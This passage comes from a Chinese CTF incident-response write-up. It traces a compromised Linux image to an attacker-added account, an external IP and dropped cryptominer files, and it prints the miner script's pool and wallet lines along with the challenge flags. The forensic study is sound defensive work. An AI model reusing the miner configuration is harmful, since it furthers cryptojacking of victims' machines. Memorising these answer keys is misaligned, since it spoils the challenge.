<h3 id="sevrer-save-4"><a href="#sevrer-save-4" class="headerlink" title="sevrer save_4"></a>sevrer save_4</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-12.png"></p>
<p>生成的用户名和密码，直接查看<code>/etc/passwd</code>以及<code>/etc/shadow</code>分别查看账号密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-13.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-14.png"></p>
<p>所以flag为<code>ll:123456</code></p>
<h3 id="sevrer-save-5"><a href="#sevrer-save-5" class="headerlink" title="sevrer save_5"></a>sevrer save_5</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-15.png"></p>
<p>刚刚在找病毒的时候看了一个<code>.log</code>文件。<code>/home/guests/.log.txt</code>中有一个外网IP</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-16.png"></p>
<p>所以flag为<code>172.105.202.239</code></p>
<h3 id="sevrer-save-6"><a href="#sevrer-save-6" class="headerlink" title="sevrer save_6"></a>sevrer save_6</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-17.png"></p>
<p>日志文件是病毒文件运行后产生的，所以该目录下和日志文件修改时间相近的应该就是怀疑对象。从<code>main</code>文件的修改时间来看，以及<code>.idea</code>中两个看着很像挖矿程序的修改时间完全相同来猜测，<code>lolMiner</code>、<code>mine_doge.sh</code>是病毒运行后释放的文件。反正都在这个目录下</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-18.png"></p>
<p>所以flag为<code>lolMiner,mine_doge.sh</code></p>
<h3 id="sevrer-save-7"><a href="#sevrer-save-7" class="headerlink" title="sevrer save_7"></a>sevrer save_7</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-19.png"></p>
<p>这个我们得看病毒的配置文件<code>mine_doge.sh</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-20.png"></p>
<p>是不是和应急响应的那一题很像，很明显，矿池地址：<code>doge.millpools.cc:5567</code></p>
<p>所以flag为<code>doge.millpools.cc:5567</code></p>
<h3 id="sevrer-save-8"><a href="#sevrer-save-8" class="headerlink" title="sevrer save_8"></a>sevrer save_8</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-21.png"></p>
<p>还是在那个文件，挖矿的账户就是黑客钱包</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-22.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POOL=doge.millpools.cc:5567 //矿池</span><br><span class="line">WALLET=DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker //WALLET钱包</span><br></pre></td></tr></table></figure>

<p>所以flag为<code>DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker</code></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">MTRleed</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.mtrleed.top/post/12/">https://www.mtrleed.top/post/12/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.mtrleed.top" target="_blank">MTRleed</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/">数据安全</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ico.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/13/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/ico.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">pwn入门简单ROP</div></div></a></div><div class="next-post pull-right"><a href="/post/6/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2023/jdk0.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JDK安装失败</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EW-web%E6%B5%81%E9%87%8F"><span class="toc-number">3.</span> <span class="toc-text">EW(web流量)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-web-1"><span class="toc-number">3.1.</span> <span class="toc-text">ez_web_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-web-2"><span class="toc-number">3.2.</span> <span class="toc-text">ez_web_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-web-3"><span class="toc-number">3.3.</span> <span class="toc-text">ez_web_3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HW-web%E6%B5%81%E9%87%8F"><span class="toc-number">4.</span> <span class="toc-text">HW(web流量)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hard-web-1"><span class="toc-number">4.1.</span> <span class="toc-text">hard_web_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hard-web-2"><span class="toc-number">4.2.</span> <span class="toc-text">hard_web_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hard-web-3"><span class="toc-number">4.3.</span> <span class="toc-text">hard_web_3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WS-%E6%99%AE%E9%80%9A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">WS(普通流量分析)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Wireshark1-1"><span class="toc-number">5.1.</span> <span class="toc-text">Wireshark1_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wireshark1-2"><span class="toc-number">5.2.</span> <span class="toc-text">Wireshark1_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wireshark1-3"><span class="toc-number">5.3.</span> <span class="toc-text">Wireshark1_3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSW-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F"><span class="toc-number">6.</span> <span class="toc-text">SSW(蚁剑流量)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SmallSword-1"><span class="toc-number">6.1.</span> <span class="toc-text">SmallSword_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SmallSword-2"><span class="toc-number">6.2.</span> <span class="toc-text">SmallSword_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SmallSword-3"><span class="toc-number">6.3.</span> <span class="toc-text">SmallSword_3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HD-flask"><span class="toc-number">7.</span> <span class="toc-text">HD(flask)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hacked-1"><span class="toc-number">7.1.</span> <span class="toc-text">hacked_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hacked-2"><span class="toc-number">7.2.</span> <span class="toc-text">hacked_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hacked-3"><span class="toc-number">7.3.</span> <span class="toc-text">hacked_3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BF-%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-number">8.</span> <span class="toc-text">BF(虚拟机)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-forensics-1"><span class="toc-number">8.1.</span> <span class="toc-text">baby_forensics_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-forensics-1-1"><span class="toc-number">8.2.</span> <span class="toc-text">baby_forensics_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-forensics-3"><span class="toc-number">8.3.</span> <span class="toc-text">baby_forensics_3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TP-TCP%E6%B5%81%E4%B8%93%E9%A1%B9"><span class="toc-number">9.</span> <span class="toc-text">TP(TCP流专项)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tcpdump-1"><span class="toc-number">9.1.</span> <span class="toc-text">tcpdump_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcpdump-2"><span class="toc-number">9.2.</span> <span class="toc-text">tcpdump_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcpdump-3"><span class="toc-number">9.3.</span> <span class="toc-text">tcpdump_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcpdump-4"><span class="toc-number">9.4.</span> <span class="toc-text">tcpdump_4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcpdump-5"><span class="toc-number">9.5.</span> <span class="toc-text">tcpdump_5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IR-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">10.</span> <span class="toc-text">IR(应急响应)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IncidentResponse-1"><span class="toc-number">10.1.</span> <span class="toc-text">IncidentResponse_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IncidentResponse-2"><span class="toc-number">10.2.</span> <span class="toc-text">IncidentResponse_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IncidentResponse-3"><span class="toc-number">10.3.</span> <span class="toc-text">IncidentResponse_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IncidentResponse-4"><span class="toc-number">10.4.</span> <span class="toc-text">IncidentResponse_4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IncidentResponse-5"><span class="toc-number">10.5.</span> <span class="toc-text">IncidentResponse_5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IncidentResponse-6"><span class="toc-number">10.6.</span> <span class="toc-text">IncidentResponse_6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IncidentResponse-7"><span class="toc-number">10.7.</span> <span class="toc-text">IncidentResponse_7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SS-%E5%85%A5%E4%BE%B5%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">11.</span> <span class="toc-text">SS(入侵流量分析)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sevrer-save-1"><span class="toc-number">11.1.</span> <span class="toc-text">sevrer save_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sevrer-save-2"><span class="toc-number">11.2.</span> <span class="toc-text">sevrer save_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sevrer-save-3"><span class="toc-number">11.3.</span> <span class="toc-text">sevrer save_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sevrer-save-4"><span class="toc-number">11.4.</span> <span class="toc-text">sevrer save_4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sevrer-save-5"><span class="toc-number">11.5.</span> <span class="toc-text">sevrer save_5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sevrer-save-6"><span class="toc-number">11.6.</span> <span class="toc-text">sevrer save_6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sevrer-save-7"><span class="toc-number">11.7.</span> <span class="toc-text">sevrer save_7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sevrer-save-8"><span class="toc-number">11.8.</span> <span class="toc-text">sevrer save_8</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 <i class="fa-fw fas fa-heart card-announcement-animation cc_pointer"></i> MTRleed</div><div class="footer_custom_text">MTRleed|博客</div><div id="running-time"></div><script>setInterval(()=>{let create_time=Math.round(new Date(Date.UTC(2021,08,30,0,0,0)).getTime()/1000);let timestamp=Math.round((new Date().getTime()+8*60*60*1000)/1000);let second=timestamp-create_time;let time=new Array(0,0,0,0,0);if(second>=365*24*3600){time[0]=parseInt(second/(365*24*3600));second%=365*24*3600;}if(second>=24*3600){time[1]=parseInt(second/(24*3600));second%=24*3600;}if(second>=3600){time[2]=parseInt(second/3600);second%=3600;}if(second>=60){time[3]=parseInt(second/60);second%=60;}if(second>0){time[4]=second;}currentTimeHtml='小 破 站 已 艰 难 营 业 '+time[0]+' 年 '+time[1]+' 天 '+time[2]+' 时 '+time[3]+' 分 '+time[4]+' 秒';document.getElementById("running-time").innerHTML=currentTimeHtml;},1000);</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'DAdNksl9t4AvRRqv5LSI68Bw-gzGzoHsz',
      appKey: 'DxK0hMCcbzgfiNRktvLAWocH',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      placeholder: 'ヾﾉ≧∀≦)o 欢 迎 评 论 ! 填写QQ邮箱我就可以看到你的头像嗷~',
      path: window.location.pathname,
      master: '0e249a5357be07e34f42012d615f91c8',
      tagMeta:["博主","小伙伴","访客"],
      friends: ["5c0ed793d43436a166548845c8ffe455","d4f239a7347311d21f9658a44bc2d3f1"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>